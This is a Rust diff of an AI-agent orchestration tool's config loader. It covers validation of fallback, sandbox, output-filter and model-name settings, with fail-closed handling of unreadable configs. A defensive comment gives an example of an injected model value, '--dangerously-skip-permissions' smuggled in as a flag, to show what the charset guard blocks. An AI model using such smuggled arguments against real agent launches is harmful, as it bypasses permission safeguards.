+        if let Some(raw) = env("ZIRV_CTX_FALLBACK_ORDER") {
+            cfg.fallback.order = split_csv_list(&raw);
+        }
+        for (key, value) in [
+            (
+                "fallback.predictive_headroom_pct",
+                cfg.fallback.predictive_headroom_pct,
+            ),
+            (
+                "fallback.min_candidate_headroom_pct",
+                cfg.fallback.min_candidate_headroom_pct,
+            ),
+            (
+                "fallback.unknown_headroom_pct",
+                cfg.fallback.unknown_headroom_pct,
+            ),
+        ] {
+            if !(0.0..=100.0).contains(&value) {
+                return Err(format!("{key} must be between 0 and 100, got {value}").into());
+            }
+        }
+        let mut seen = std::collections::HashSet::new();
+        for name in &cfg.fallback.order {
+            if !super::adapters::ADAPTERS
+                .iter()
+                .any(|(known, _)| known == name)
+            {
+                return Err(format!(
+                    "fallback.order contains unknown agent '{name}'; known adapters: {}",
+                    super::adapters::ADAPTERS
+                        .iter()
+                        .map(|(known, _)| *known)
+                        .collect::<Vec<_>>()
+                        .join(", ")
+                )
+                .into());
+            }
+            if !seen.insert(name.clone()) {
+                return Err(format!("fallback.order contains duplicate agent '{name}'").into());
+            }
+        }
+        if let Some(value) = cfg.fallback.orchestrator_rollover_headroom_pct
+            && !(0.0..=100.0).contains(&value)
+        {
+            return Err(format!(
+                "fallback.orchestrator_rollover_headroom_pct must be between 0 and 100, got {value}"
+            )
+            .into());
+        }
+        // Issue #455 (review round 1, finding 9): the breaker's own knobs.
+        // `open_after_failures` above the observation ring can never be
+        // reached, so the breaker would silently never open; a zero window
+        // discards every observation the instant it is recorded, and a zero
+        // cooldown makes every poll a trial.
+        if !(1..=super::health::MAX_OBSERVATIONS as u32)
+            .contains(&cfg.fallback.health.open_after_failures)
+        {
+            return Err(format!(
+                "fallback.health.open_after_failures must be between 1 and {}, got {}",
+                super::health::MAX_OBSERVATIONS,
+                cfg.fallback.health.open_after_failures
+            )
+            .into());
+        }
+        for (key, value) in [
+            (
+                "fallback.health.window_secs",
+                cfg.fallback.health.window_secs,
+            ),
+            (
+                "fallback.health.cooldown_secs",
+                cfg.fallback.health.cooldown_secs,
+            ),
+        ] {
+            if value == 0 {
+                return Err(format!("{key} must be greater than 0, got {value}").into());
+            }
+        }
+        // Slice A: the degrade knobs. A 0% rate degrades every route that
+        // ever sees one failure and a rate above 100 can never be reached;
+        // a single sample is not a rate at all; and a sub-second first-token
+        // threshold would mark every thinking model degraded.
+        if !(1..=100).contains(&cfg.fallback.health.degrade_error_rate_pct) {
+            return Err(format!(
+                "fallback.health.degrade_error_rate_pct must be between 1 and 100, got {}",
+                cfg.fallback.health.degrade_error_rate_pct
+            )
+            .into());
+        }
+        // Finding 12: bounded above by the ring the samples land in, or the
+        // signal can never fire at all -- a minimum the evidence store
+        // cannot physically reach is a silently dead knob, exactly what the
+        // `open_after_failures` bound above exists to prevent. The latency
+        // ring is the smaller of the two, so enabling the latency signal
+        // tightens the ceiling.
+        let sample_ceiling = if cfg.fallback.health.degrade_ttft_ms.is_some() {
+            super::health::MAX_OBSERVATIONS as u32
+        } else {
+            super::health::MAX_SAMPLES as u32
+        };
+        if !(2..=sample_ceiling).contains(&cfg.fallback.health.degrade_min_samples) {
+            return Err(format!(
+                "fallback.health.degrade_min_samples must be between 2 and {sample_ceiling}, got {}",
+                cfg.fallback.health.degrade_min_samples
+            )
+            .into());
+        }
+        if let Some(ttft_ms) = cfg.fallback.health.degrade_ttft_ms
+            && ttft_ms < 1_000
+        {
+            return Err(format!(
+                "fallback.health.degrade_ttft_ms must be at least 1000, got {ttft_ms}"
+            )
+            .into());
+        }
+        for (name, limits) in &cfg.fallback.harness {
+            if !super::adapters::ADAPTERS
+                .iter()
+                .any(|(known, _)| known == name)
+            {
+                return Err(format!(
+                    "fallback.harness contains unknown agent '{name}'; known adapters: {}",
+                    super::adapters::ADAPTERS
+                        .iter()
+                        .map(|(known, _)| *known)
+                        .collect::<Vec<_>>()
+                        .join(", ")
+                )
+                .into());
+            }
+            if let Some(value) = limits.reserve_headroom_pct
+                && !(0.0..=100.0).contains(&value)
+            {
+                return Err(format!(
+                    "fallback.harness.{name}.reserve_headroom_pct must be between 0 and 100, got {value}"
+                )
+                .into());
+            }
+        }
+
+        // The union: the operator's own home-layer entries plus the repo's,
+        // never fewer than either -- narrowing can only add restriction.
+        // `ZIRV_CTX_SANDBOX_EXTRA_DENY`, when set, replaces this outright
+        // (the operator's own final word, same as every other env escape
+        // hatch), and `ZIRV_CTX_SANDBOX_EXTRA_ALLOW` replaces the plain
+        // merged (operator-only, `REPO_FORBIDDEN`) `extra_allow` the same
+        // way. Neither goes through `ENV_MAP`/`EnvKind`, which has no
+        // list-shaped variant; both are simple comma-separated overrides.
+        cfg.sandbox.extra_deny = match env("ZIRV_CTX_SANDBOX_EXTRA_DENY") {
+            Some(raw) => split_csv_list(&raw),
+            None => {
+                let mut combined = home_extra_deny;
+                combined.extend(repo_extra_deny);
+                combined
+            }
+        };
+        if let Some(raw) = env("ZIRV_CTX_SANDBOX_EXTRA_ALLOW") {
+            cfg.sandbox.extra_allow = split_csv_list(&raw);
+        }
+
+        // Same operator-only override shape as `extra_allow` right above:
+        // `dash.workdir_roots` is `REPO_FORBIDDEN` outright (see its own doc
+        // comment), so there is no repo contribution to union in -- only the
+        // operator's own home layer, or `ZIRV_CTX_DASH_WORKDIR_ROOTS`
+        // replacing it outright when set.
+        if let Some(raw) = env("ZIRV_CTX_DASH_WORKDIR_ROOTS") {
+            cfg.dash.workdir_roots = split_csv_list(&raw);
+        }
+
+        // Same operator-only override shape as `extra_allow` right above:
+        // when set, `ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH` replaces
+        // whatever `workflow.check_env_passthrough` the merged TOML layers
+        // produced (`REPO_FORBIDDEN` already means that can only be the
+        // operator's own `~/.zirv/ctx.toml`). This list is itself only ever
+        // ADDED to `verification::DEFAULT_CHECK_ENV_PASSTHROUGH` at the
+        // point of use, never a replacement for those built-in defaults.
+        if let Some(raw) = env("ZIRV_CTX_WORKFLOW_CHECK_ENV_PASSTHROUGH") {
+            cfg.workflow.check_env_passthrough = split_csv_list(&raw);
+        }
+
+        // Same operator-only override shape, for issue #276's builtin
+        // self-check exclude list: `ZIRV_CTX_WORKFLOW_BUILTIN_CHECKS_EXCLUDE`
+        // replaces whatever `workflow.builtin_checks_exclude` the merged TOML
+        // layers produced.
+        if let Some(raw) = env("ZIRV_CTX_WORKFLOW_BUILTIN_CHECKS_EXCLUDE") {
+            cfg.workflow.builtin_checks_exclude = split_csv_list(&raw);
+        }
+
+        // Issue #326: same list-valued env convention -- `ZIRV_CTX_OUTPUT_
+        // VERBATIM` replaces whatever `[output] verbatim` the merged TOML
+        // layers produced (which, being `REPO_FORBIDDEN`, can only ever have
+        // come from the operator's own home layer anyway).
+        if let Some(raw) = env("ZIRV_CTX_OUTPUT_VERBATIM") {
+            cfg.output.verbatim = split_csv_list(&raw);
+        }
+
+        // A cap below `MIN_MAX_SUMMARY_BYTES` cannot hold a header, a failure
+        // line and the retrieval line at once, so honoring it literally would
+        // mean emitting summaries with the failures cut off -- the one thing
+        // `output::render_summary` must never do. Refused by name rather than
+        // silently clamped.
+        if cfg.output.max_summary_bytes < MIN_MAX_SUMMARY_BYTES {
+            return Err(format!(
+                "`output.max_summary_bytes` must be at least {MIN_MAX_SUMMARY_BYTES} (got {}): a \
+                 smaller cap cannot hold a summary's own failure lines and its retrieval line.",
+                cfg.output.max_summary_bytes
+            )
+            .into());
+        }
+
+        // Issue #417: every `[[output.filter]]` rule's regexes must compile,
+        // `match_command` must be fully anchored, and names must be unique --
+        // see `validate_output_filter_rules`'s own doc comment. `output.filter`
+        // being `REPO_FORBIDDEN` means this list can only ever have come from
+        // the operator's own home layer by the time we reach here.
+        validate_output_filter_rules(&cfg.output.filter)?;
+
+        // Bundled defaults (see `OutputConfig::filter_defaults`'s own doc
+        // comment): appended AFTER validating the operator's own rules above,
+        // so an operator rule always precedes every bundled rule, and skipped
+        // for any bundled `name` the operator already declared -- an operator
+        // rule with a bundled rule's name REPLACES it outright rather than
+        // running alongside it. `bundled_output_filter_rules` ships its own
+        // rules already anchored/compiling/unique, so no second `validate_
+        // output_filter_rules` pass is needed here.
+        if cfg.output.filter_defaults {
+            let operator_names: Vec<String> = cfg
+                .output
+                .filter
+                .iter()
+                .map(|rule| rule.name.clone())
+                .collect();
+            cfg.output.filter.extend(
+                super::output_filters::bundled_output_filter_rules()
+                    .into_iter()
+                    .filter(|rule| !operator_names.contains(&rule.name)),
+            );
+        }
+
+        // Same union as `extra_deny` above, for `heavy_command_patterns`: the
+        // operator's own home-layer patterns plus whatever the repo adds,
+        // never fewer than either -- a repo layer may only add a pattern
+        // (narrowing), never remove or replace the operator's own list. No
+        // env override exists for this key today, unlike `extra_deny`/
+        // `extra_allow`.
+        let mut heavy_patterns = home_heavy_patterns;
+        heavy_patterns.extend(repo_heavy_patterns);
+        cfg.supervise.heavy_command_patterns = heavy_patterns;
+
+        // SECURITY (command-injection defense): `chat.model` is one of the few
+        // keys a repo `ctx.toml` may set (see `REPO_FORBIDDEN`'s `chat.model`
+        // note), and it is appended to an interactive launch's argv via
+        // `AgentAdapter::model_args`. On Windows an npm-installed agent resolves
+        // to a `.cmd` shim that zirv routes through `cmd.exe /c`, which
+        // re-parses that argv -- so an unconstrained model string is a repo-
+        // controlled path into a shell command line. Constrain it to a charset
+        // that cannot express any shell/cmd metacharacter (space, quote,
+        // `& | ^ < > ( ) % ! ` backtick, newline are all excluded), so the
+        // repo-settable exemption cannot carry a payload. `:` `/` `@` are kept
+        // so Bedrock/Vertex ids (`us.anthropic.claude-...-v1:0`,
+        // `claude-...@20250101`) stay valid. The `ZIRV_CTX_CHAT_MODEL` env path
+        // merged above is validated identically, since it merges before here,
+        // and every downstream surface (banner, dashboard header, `model_args`)
+        // reads the value only after this point.
+        if let Some(model) = cfg.chat.model.as_deref() {
+            validate_model_str("chat.model", model)?;
+        }
+
+        // Issue #504: `chat.claude_permission_mode` reaches an interactive
+        // launch's own `--permission-mode` argv (`ClaudeAdapter::default_
+        // sandbox_args`) verbatim, so it is constrained to exactly the fixed
+        // set Claude Code's own CLI accepts, the same "loud rather than
+        // silent" style `validate_endpoint_target`'s `wire_api` check uses --
+        // an unrecognized value is a load-time error naming the key, never a
+        // value that reaches argv unexamined or silently falls back to
+        // `"default"`.
+        if let Some(mode) = cfg.chat.claude_permission_mode.as_deref()
+            && !matches!(mode, "default" | "acceptEdits" | "bypassPermissions")
+        {
+            return Err(format!(
+                "chat.claude_permission_mode must be \"default\", \"acceptEdits\" or \
+                 \"bypassPermissions\", got \"{mode}\""
+            )
+            .into());
+        }
+
+        // `review.claude`/`review.codex` land in injected prompt text (see
+        // `review_roster_line` in `adapters/mod.rs`, the harness-roster line
+        // an Orchestrator session's own base prompt reads), not in argv
+        // directly -- but that session may itself later re-type the value
+        // onto a real command line (e.g. `zirv agent <name> ...`), so the
+        // same charset/length/leading-dash guard is defense for both: the
+        // prompt-injection surface today, and the argv it may be re-typed
+        // onto tomorrow. `REPO_FORBIDDEN` (see its own comment on the
+        // `review` entry) is what keeps a checked-out repo from setting
+        // these at all; this is the second, independent layer that bounds
+        // what even an operator's own value can carry.
+        if let Some(model) = cfg.review.claude.as_deref() {
+            validate_model_str("review.claude", model)?;
+        }
+        if let Some(model) = cfg.review.codex.as_deref() {
+            validate_model_str("review.codex", model)?;
+        }
+
+        // `worker.claude`/`worker.codex` reach a real launch argv directly
+        // (`adapters::worker_model_args` -> `AgentAdapter::model_args`), an
+        // even more direct path than `review.*`'s own prompt-text injection
+        // above, so the same guard applies.
+        if let Some(model) = cfg.worker.claude.as_deref() {
+            validate_model_str("worker.claude", model)?;
+        }
+        if let Some(model) = cfg.worker.codex.as_deref() {
+            validate_model_str("worker.codex", model)?;
+        }
+
+        // `handover.<agent>.<tier>` reach a real launch argv directly too
+        // (`handover::resolve_swap_launch` -> `AgentAdapter::model_args`),
+        // the same path `worker.claude`/`worker.codex` take, so the same
+        // guard applies to all six leaves.
+        if let Some(model) = cfg.handover.claude.cheap.as_deref() {
+            validate_model_str("handover.claude.cheap", model)?;
+        }
+        if let Some(model) = cfg.handover.claude.standard.as_deref() {
+            validate_model_str("handover.claude.standard", model)?;
+        }
+        if let Some(model) = cfg.handover.claude.deep.as_deref() {
+            validate_model_str("handover.claude.deep", model)?;
+        }
+        if let Some(model) = cfg.handover.codex.cheap.as_deref() {
+            validate_model_str("handover.codex.cheap", model)?;
+        }
+        if let Some(model) = cfg.handover.codex.standard.as_deref() {
+            validate_model_str("handover.codex.standard", model)?;
+        }
+        if let Some(model) = cfg.handover.codex.deep.as_deref() {
+            validate_model_str("handover.codex.deep", model)?;
+        }
+
+        // Issue #395: `[endpoint.claude]`/`[endpoint.codex]` are `REPO_
+        // FORBIDDEN` outright (see that entry's own comment), so by this
+        // point either is `Some` only from the operator's own home layer.
+        // Validated here, once, rather than at every read site: a launch
+        // that reaches `AgentAdapter::ready()`/`base()`/`model_args` with a
+        // resolved `EndpointTarget` in hand can trust `vendor` names a real
+        // catalogue vendor without re-checking.
+        if let Some(target) = cfg.endpoint.claude.as_ref() {
+            validate_endpoint_target("endpoint.claude", target)?;
+        }
+        if let Some(target) = cfg.endpoint.codex.as_ref() {
+            validate_endpoint_target("endpoint.codex", target)?;
+        }
+
+        // Issue #537 seam: `[proxy]` bounds, checked once here rather than
+        // re-clamped or re-floored at every read site -- see `ProxyConfig`'s
+        // own doc comment for why this is a load-time error, not a silent
+        // clamp, matching the `fallback.*` percentage checks above.
+        if !(0.0..=1.0).contains(&cfg.proxy.min_confidence) {
+            return Err(format!(
+                "proxy.min_confidence must be between 0.0 and 1.0, got {}",
+                cfg.proxy.min_confidence
+            )
+            .into());
+        }
+        if !(0.0..=1.0).contains(&cfg.proxy.min_margin) {
+            return Err(format!(
+                "proxy.min_margin must be between 0.0 and 1.0, got {}",
+                cfg.proxy.min_margin
+            )
+            .into());
+        }
+        if cfg.proxy.typesafe.timeout_secs < 1 {
+            return Err(format!(
+                "proxy.typesafe.timeout_secs must be at least 1, got {}",
+                cfg.proxy.typesafe.timeout_secs
+            )
+            .into());
+        }
+        if cfg.proxy.request_max_bytes < MIN_PROXY_REQUEST_MAX_BYTES {
+            return Err(format!(
+                "proxy.request_max_bytes must be at least {MIN_PROXY_REQUEST_MAX_BYTES}, got {}",
+                cfg.proxy.request_max_bytes
+            )
+            .into());
+        }
+
+        cfg.agents = crate::settings::AgentGate::load(repo, env)?;
+        cfg.policy = super::policy::resolve(home_policy, repo_policy, env)?;
+        cfg.safety = super::safety::resolve(home_safety, repo_safety, env)?;
+        cfg.unparsable_layers = unparsable_layers;
+        announce_unparsable_layers_once(&cfg);
+        Ok(cfg)
+    }
+
+    /// `load`, plus a refusal a plain `load` deliberately does not make: a
+    /// verb that is about to launch or supervise a harness (`chat`, `wrap`,
+    /// `exec`, `loop`, `agent`, `handover`, and `dash`'s pane spawns, which
+    /// all route through `wrap::run_with`) must not silently fall back to
+    /// permissive `[pace]`/`[policy]`/`[sandbox]` defaults just because the
+    /// operator's own `~/.zirv/ctx.toml` has a syntax error. A REPO-layer
+    /// parse failure is still skipped exactly as `load` does -- that file is
+    /// untrusted, user-reported input, and skipping it can only ever narrow
+    /// (defaults are the safe posture) or leave the operator's own stricter
+    /// home settings in force. Read-only/diagnostic verbs (`status`,
+    /// `optimize`, `safety list`/`explain`, and everything else that never
+    /// spawns a harness) call `load` directly and keep reporting a broken
+    /// home layer inline rather than refusing -- see each call site.
+    pub fn load_for_launch(repo: &Path, env: EnvLookup<'_>) -> CtxResult<Self> {
+        let cfg = Self::load(repo, env)?;
+        if let Some(layer) = cfg.unparsable_layers.iter().find(|l| l.is_home) {
+            return Err(format!(
+                "{}: {}\nThis is your own home config (~/{}/{}), not the repo's -- fix the \
+                 syntax error above, or remove the file to fall back to defaults. Refusing to \
+                 launch rather than silently dropping back to permissive pacing/policy/sandbox \
+                 defaults.",
+                layer.path.display(),
+                layer.message,
+                crate::utils::SCRIPT_DIR_NAME,
+                CTX_CONFIG_FILE,
+            )
+            .into());
+        }
+        Ok(cfg)
+    }
+}
+
+/// Emits [`super::announce::Event::ConfigUnparsable`] on the `zirv \u{25b8}`
+/// channel, exactly once per process and only when the operator has not
+/// opted out (`cfg.chrome.events`) -- the same latch discipline `poll.rs`'s
+/// `announce_keychain_prompt_once` uses, applied here as a process-wide
+/// `AtomicBool` for the same reason: `CtxConfig::load` has no per-run state
+/// of its own to carry a flag in, and it is called from dozens of call sites
+/// across one process. A no-op when `cfg.unparsable_layers` is empty, so
+/// every ordinary `load` call pays only the one cheap check.
+fn announce_unparsable_layers_once(cfg: &CtxConfig) {
+    if cfg.unparsable_layers.is_empty() || !cfg.chrome.events {
+        return;
+    }
+    static ANNOUNCED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
+    let already_announced = ANNOUNCED
+        .compare_exchange(
+            false,
+            true,
+            std::sync::atomic::Ordering::SeqCst,
+            std::sync::atomic::Ordering::SeqCst,
+        )
+        .is_err();
+    if already_announced {
+        return;
+    }
+    let detail = cfg
+        .unparsable_layers
+        .iter()
+        .map(|layer| format!("{}: {}", layer.path.display(), layer.message))
+        .collect::<Vec<_>>()
+        .join("; ");
+    super::announce::Announcer::new(true, console::colors_enabled_stderr())
+        .emit(&super::announce::Event::ConfigUnparsable { detail });
+}
+
+/// The shared "config failed to load" fallback `optimize.rs` (report-only)
+/// and `hook.rs` (the `Stop` hook) both need: neither may hard-fail a run
+/// over a bad config, but degrading all the way to `CtxConfig::default()`
+/// hands back a fully permissive `AgentGate` (review finding 1, see
+/// `hook.rs`'s own `cfg_or_operator_only_gate` doc) and, since issue #44
+/// made `cfg.policy` load-bearing (the context compiler attaches it to every
+/// `CompiledContext`), a fully permissive `EffectivePolicy` too -- `Allow`
+/// on every capability, the widest policy zirv can state, minted from a
+/// config that could not even be parsed. That is a fail-open on the one
+/// surface this module exists to keep narrowing-only. `AgentGate::load_
+/// operator_only` and `EffectivePolicy::fail_closed` are substituted for
+/// those two fields; every other field keeps its ordinary default, since
+/// nothing else in `CtxConfig` is a security boundary the way the gate and
+/// the policy are.
+///
+/// Finding #5 (issue #358 review): `supervise.orchestrator_writes` is a
+/// THIRD such boundary, and it is not exempt just because it defaults to
+/// `Advise` rather than the fully-permissive extreme -- an operator who set
+/// `deny` still has that narrower posture WIDENED to `Advise` the moment a
+/// config load fails, and a repository-owned layer (`ctx.toml`, `.settings.
+/// toml`) can induce that failure at will. Forced to `Deny` here for the
+/// same reason `policy` is forced `fail_closed`: a config that could not
+/// even be read must never be read as permission to write. `prompt.
+/// orchestrator_writes` is kept in lockstep (it is `CtxConfig::load`'s own
+/// synced copy of this same field -- see `PromptConfig::orchestrator_writes`'s
+/// doc comment) so every consumer, not just `hook::orchestrator_write_
+/// posture`'s own read of `supervise`, sees the same degraded posture.
+pub(crate) fn degrade_to_operator_only(env: EnvLookup<'_>) -> CtxConfig {
+    let mut cfg = CtxConfig {
+        agents: crate::settings::AgentGate::load_operator_only(env),
+        policy: super::policy::EffectivePolicy::fail_closed(),
+        ..CtxConfig::default()
+    };
+    cfg.supervise.orchestrator_writes = OrchestratorWrites::Deny;
+    cfg.prompt.orchestrator_writes = OrchestratorWrites::Deny;
+    // The bundled `[[output.filter]]` rules are `load`'s doing, not
+    // `OutputConfig::default()`'s, so a degraded config adds them itself:
+    // they only ever strip noise from a summary, so a config that could not
+    // be read still compacts the way an absent one does.
+    cfg.output.filter = super::output_filters::bundled_output_filter_rules();
+    cfg
+}
+
+/// Whether every top-level `|` alternative in `pattern` starts with `^`.
+/// Issue #417: `[[output.filter]]`'s `match_command` is required to be fully
+/// anchored -- `gradle` would also match `my-not-gradle-thing`, which is
+/// almost certainly not what an operator naming a program meant -- and
+/// "starts with `^`" has to be checked per top-level alternative, not on the
+/// pattern as a whole, because `^a|b` is unanchored on its `b` branch even
+/// though the string itself starts with `^`.
+///
+/// Splits on `|` at nesting depth 0 relative to `(...)` groups and outside
+/// any `[...]` character class, honouring `\`-escapes so an escaped `\|` or
+/// `\[` never it self toggles class/group state. A leading `(?flags)` inline
+/// modifier group (e.g. `(?i)^a`) is stripped before the `^` check, since it
+/// is common and does not weaken the anchor. `(^a|b)` -- one top-level
+/// alternative, the whole parenthesized group, which does not itself start
+/// with `^` -- is correctly rejected; `^a|^b`, `(?i)^a` and `^(a|b)` are all
+/// accepted.
+pub(crate) fn is_fully_anchored(pattern: &str) -> bool {
+    split_top_level_alternatives(pattern)
+        .into_iter()
+        .all(starts_with_anchor)
+}
+
+/// Splits `pattern` on every top-level `|` (see [`is_fully_anchored`]'s own
+/// doc comment for exactly what "top-level" means here).
+fn split_top_level_alternatives(pattern: &str) -> Vec<&str> {
+    let mut parts = Vec::new();
+    let mut depth = 0i32;
+    let mut in_class = false;
+    let mut escaped = false;
+    let mut start = 0usize;
+    for (idx, ch) in pattern.char_indices() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        match ch {
+            '\\' => escaped = true,
+            '[' if !in_class => in_class = true,
+            ']' if in_class => in_class = false,
+            '(' if !in_class => depth += 1,
+            ')' if !in_class => depth -= 1,
+            '|' if !in_class && depth <= 0 => {
+                parts.push(&pattern[start..idx]);
+                start = idx + 1;
+            }
+            _ => {}
+        }
+    }
+    parts.push(&pattern[start..]);
+    parts
+}
+
+/// Whether `alternative` starts with `^` or `\A`, after skipping past zero or
+/// more leading `(?flags)` inline modifier groups (letters/`-` only between
+/// `(?` and `)`, e.g. `(?i)`, `(?is)`, `(?-i)`) -- those do not weaken an
+/// anchor, so `(?i)^a` counts as anchored the same as plain `^a`. `\A` (the
+/// regex crate's "absolute start of haystack" anchor) is accepted alongside
+/// `^` since it anchors even under the `m` flag, where `^` would not.
+fn starts_with_anchor(alternative: &str) -> bool {
+    let mut rest = alternative;
+    while let Some(after) = strip_one_inline_flag_group(rest) {
+        rest = after;
+    }
+    rest.starts_with('^') || rest.starts_with("\\A")
+}
+
+/// Review finding: a leading inline flag group is only harmless to strip
+/// past when it does not itself enable the multiline flag `m` -- `(?m)^a` is
+/// NOT fully anchored, because under `m`, `^` matches at the start of every
+/// line, not just the start of the whole haystack (and `hook::run_posttool`
+/// composes a command line that can itself contain embedded newlines, e.g. a
+/// heredoc Bash command). So this only strips a flag group whose `m` is
+/// either absent or explicitly disabled (`(?-m)`); a group that enables `m`
+/// (`(?m)`, `(?im)`, `(?i-m)` does NOT count as enabling it since `-m` wins)
+/// is left in place, which makes `starts_with_anchor` correctly see a `(`,
+/// not a `^`, and reject the pattern as unanchored.
+fn strip_one_inline_flag_group(s: &str) -> Option<&str> {
+    let body = s.strip_prefix("(?")?;
+    let end = body.find(')')?;
+    let flags = &body[..end];
+    if !flags.is_empty()
+        && flags.chars().all(|c| c.is_ascii_alphabetic() || c == '-')
+        && !flag_group_enables_multiline(flags)
+    {
+        Some(&body[end + 1..])
+    } else {
+        None
+    }
+}
+
+/// Whether an inline flag group's flag list (the text between `(?` and `)`,
+/// e.g. `"im"`, `"i-m"`, `"-m"`) enables the multiline flag `m` -- i.e. `m`
+/// appears before any `-`, or there is no `-` at all and `m` appears. Once a
+/// `-` is seen, every flag after it is being DISABLED, so `(?-m)` and
+/// `(?i-m)` do not enable `m` even though the letter appears in the string.
+fn flag_group_enables_multiline(flags: &str) -> bool {
+    let disable_at = flags.find('-');
+    let enabled_part = match disable_at {
+        Some(idx) => &flags[..idx],
+        None => flags,
+    };
+    enabled_part.contains('m')
+}
+
+/// Review finding: `is_fully_anchored`'s per-alternative check above is
+/// defeated if ANY inline flag group in the whole pattern enables `m`,
+/// wherever it appears -- not just a leading one `strip_one_inline_flag_
+/// group` walks past. A group later in the pattern (`^a|(?m)^b`) still makes
+/// every subsequent `^` in the SAME regex match at any line start once the
+/// regex crate applies it, so `validate_output_filter_rules` scans the whole
+/// `match_command` string for one, rather than relying solely on the leading-
+/// group walk. Matches `(?flags)` and `(?flags:...)` (a scoped group), since
+/// both syntaxes enable flags for what follows.
+fn contains_multiline_enabling_flag_group(pattern: &str) -> bool {
+    let mut idx = 0usize;
+    while let Some(rel) = pattern[idx..].find("(?") {
+        let start = idx + rel + 2;
+        let after = &pattern[start..];
+        // The flags body is the run of ASCII letters/`-` right after `(?`;
+        // it is a real inline flag group only when that run is immediately
+        // followed by `)` (`(?flags)`) or `:` (`(?flags:...)`, a scoped
+        // group) -- anything else (`(?:...)`, `(?=...)`, `(?<name>...)`,
+        // ...) is a different construct entirely and must not be misread as
+        // one.
+        let flag_len = after
+            .bytes()
+            .take_while(|&b| b.is_ascii_alphabetic() || b == b'-')
+            .count();
+        let flags = &after[..flag_len];
+        let terminator = after.as_bytes().get(flag_len).copied();
+        if !flags.is_empty()
+            && matches!(terminator, Some(b')') | Some(b':'))
+            && flag_group_enables_multiline(flags)
+        {
+            return true;
+        }
+        // Advance past this `(?` occurrence (by at least one byte) so a
+        // non-match can't loop forever re-finding the same spot.
+        idx = start + flag_len.max(1);
+        if idx > pattern.len() {
+            break;
+        }
+    }
+    false
+}
+
+/// Load-time validation for `[[output.filter]]` (issue #417): every regex
+/// must compile, `match_command` must be fully anchored
+/// ([`is_fully_anchored`]), and no two rules may share a `name` -- every
+/// error names the offending rule so an operator can find it without
+/// guessing which of several is at fault. Called once from `CtxConfig::load`
+/// after the layers are merged; never re-checked at apply time in
+/// `output.rs`, which trusts a config that reached this point.
+pub(crate) fn validate_output_filter_rules(rules: &[OutputFilterRule]) -> CtxResult<()> {
+    let mut seen_names = std::collections::HashSet::new();
+    for rule in rules {
+        if !seen_names.insert(rule.name.as_str()) {
+            return Err(format!(
+                "output.filter \"{}\": duplicate rule name -- every [[output.filter]] entry needs \
+                 a unique `name`",
+                rule.name
+            )
+            .into());
+        }
+        if let Err(e) = regex::Regex::new(&rule.match_command) {
+            return Err(format!(
+                "output.filter \"{}\": match_command {:?} is not a valid regex: {e}",
+                rule.name, rule.match_command
+            )
+            .into());
+        }
+        // Review finding: checked before the generic anchor check below so
+        // an operator sees the specific, actionable reason -- a leading
+        // `^` under the `m` flag anchors at any LINE start, not the start
+        // of the whole command line, and `hook::run_posttool`'s composed
+        // command line can itself contain embedded newlines (a heredoc Bash
+        // command), so an `m`-enabled match_command can match a line deep
+        // inside an unrelated command.
+        if contains_multiline_enabling_flag_group(&rule.match_command) {
+            return Err(format!(
+                "output.filter \"{}\": match_command must not enable the multiline flag (m): \
+                 ^ must anchor the whole command line",
+                rule.name
+            )
+            .into());
+        }
+        if !is_fully_anchored(&rule.match_command) {
+            return Err(format!(
+                "output.filter \"{}\": match_command must be fully anchored (every top-level \
+                 alternative starts with `^`), got {:?}",
+                rule.name, rule.match_command
+            )
+            .into());
+        }
+        for pattern in &rule.strip_lines {
+            if let Err(e) = regex::Regex::new(pattern) {
+                return Err(format!(
+                    "output.filter \"{}\": strip_lines pattern {pattern:?} is not a valid regex: \
+                     {e}",
+                    rule.name
+                )
+                .into());
+            }
+        }
+        for pattern in &rule.keep_lines {
+            if let Err(e) = regex::Regex::new(pattern) {
+                return Err(format!(
+                    "output.filter \"{}\": keep_lines pattern {pattern:?} is not a valid regex: \
+                     {e}",
+                    rule.name
+                )
+                .into());
+            }
+        }
+        if let Some(match_output) = &rule.match_output
+            && let Err(e) = regex::Regex::new(&match_output.pattern)
+        {
+            return Err(format!(
+                "output.filter \"{}\": match_output.pattern {:?} is not a valid regex: {e}",
+                rule.name, match_output.pattern
+            )
+            .into());
+        }
+    }
+    Ok(())
+}
+
+/// SECURITY (command-injection defense): shared charset/length/leading-dash
+/// guard for every argv-bound model string this config exposes (`chat.model`,
+/// `review.claude`, `review.codex`, `worker.claude`, `worker.codex`) -- see
+/// the call site above `chat.model`'s own doc comment for the full Windows
+/// cmd.exe-reparse threat model this defends against. `key` is the dotted
+/// config path named in the returned error, so a caller can tell which of
+/// several model fields failed.
+///
+/// `pub(crate)`: `dash/mod.rs`'s `pane_model_args` also needs this exact
+/// guard, for the same reason -- a dashboard spawn request's `model` reaches
+/// a launch argv just like `worker.claude`/`worker.codex` do, so it gets the
+/// same charset/length/leading-dash check rather than a second, possibly
+/// drifting copy of it.
+pub(crate) fn validate_model_str(key: &str, model: &str) -> CtxResult<()> {
+    if model.is_empty()
+        || model.len() > 128
+        // A leading `-` would let the value pose as its own flag on the
+        // launch argv (`--model --dangerously-skip-permissions`), so it is
+        // rejected even though `-` is otherwise a legal model-id character.
+        // Anchored here rather than dropped from the charset, since a hyphen
+        // mid-id (`claude-opus-5`) is legitimate.
+        || model.starts_with('-')
+        || !model
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.' | '_' | ':' | '/' | '@'))
+    {
+        return Err(format!(
+            "invalid ctx config: `{key}` may contain only ASCII letters, digits and `-._:/@` and \
+             may not begin with `-`, got '{model}'"
+        )
+        .into());
+    }
+    Ok(())
+}
+
+/// Issue #395: load-time validation for one `[endpoint.claude]`/`[endpoint.
+/// codex]` table. Named errors -- `key` prefixes every message with the
+/// dotted table path (`"endpoint.claude"`), so an operator with both tables
+/// misconfigured sees which one failed. Never reads or prints
+/// `credential_env`'s VALUE -- only its own name is validated, and only as a
+/// shell-identifier shape (`AgentAdapter::ready()` is what checks the named
+/// variable actually resolves to a non-empty secret, at launch time, not
+/// here).
+fn validate_endpoint_target(key: &str, target: &EndpointTarget) -> CtxResult<()> {
+    let vendor = super::catalogue::vendor(&target.vendor).ok_or_else(|| {
+        let known: Vec<&str> = super::catalogue::vendors().iter().map(|v| v.slug).collect();
+        format!(
+            "{key}: vendor \"{}\" is not a catalogue vendor (known: {})",
+            target.vendor,
+            known.join(", ")
+        )
+    })?;
+
